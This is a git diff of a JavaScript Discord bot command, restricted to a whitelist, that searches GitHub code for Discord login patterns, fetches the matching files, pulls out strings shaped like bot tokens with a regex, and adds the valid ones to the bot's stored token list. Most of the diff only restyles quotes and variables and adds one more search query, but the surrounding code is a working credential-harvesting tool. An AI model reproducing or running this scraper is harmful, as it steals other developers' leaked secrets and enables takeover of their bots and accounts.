@@ -1,5 +1,5 @@
 const Commands = require(`../../../../__Global/Structures/Commands`);
-const { get } = require('snekfetch');
+const { get } = require(`snekfetch`);
 
 class Command extends Commands {
 	constructor(client) {
@@ -18,28 +18,29 @@ class Command extends Commands {
 		});
 	}
 
-	async run(client, message, args) {
+	async run(client, message) {
 		if (!client.whitelist.includes(message.author.id)) return message.channel.send(`Sorry, you do not have permission for this command`);
 		const queries = [
-			'require(\'discord.js\')',
-			'discord "bot.run"',
-			'discord "client.run"',
-			'discord "bot.login"',
-			'discord "client.login"',
-			'discord.js "bot.login"',
-			'discord.js "client.login"',
-			'discord.io new client token'
+			`require('discord.js')`,
+			`discord "bot.run"`,
+			`discord "client.run"`,
+			`discord "bot.login"`,
+			`discord "client.login"`,
+			`discord.js "bot.login"`,
+			`discord.js "client.login"`,
+			`discord.io new client token`,
+			`discord token`
 		];
 		const files = [];
 
 		for (const query of queries) {
-			const { body } = await get(`https://api.github.com/search/code?q=${encodeURIComponent(`${query} language:javascript`).replace(/%20/g, '+')}`).set('Authorization', process.env.GITHUB_API);
-			files.push(...body.items.map(item => item.url.split('?')[0]).filter(url => !files.includes(url)));
+			const { body } = await get(`https://api.github.com/search/code?q=${encodeURIComponent(`${query} language:javascript`).replace(/%20/g, `+`)}`).set(`Authorization`, process.env.GITHUB_API);
+			files.push(...body.items.map(item => item.url.split(`?`)[0]).filter(url => !files.includes(url)));
 		}
 
-		let log = { SUCCEEDED: 0, FAILED: 0 };
+		const log = { SUCCEEDED: 0, FAILED: 0 };
 		for (const file of files) {
-			const res = await get(file).set('Authorization', process.env.GITHUB_API);
+			const res = await get(file).set(`Authorization`, process.env.GITHUB_API);
 			const content = Buffer.from(res.body.content, `base64`).toString(`ascii`);
 			await setTimeout(() => null, 1000);
 			const tokens = content.match(/M[A-Za-z0-9._-]{58}/g);
@@ -54,7 +55,7 @@ class Command extends Commands {
 						);
 						if (client.tokens.includes(token)) return;
 						client.tokens.push(token);
-					}).catch(() => log.FAILED += 1);
+					}).catch(() => { log.FAILED += 1; });
 				});
 			}
 		}
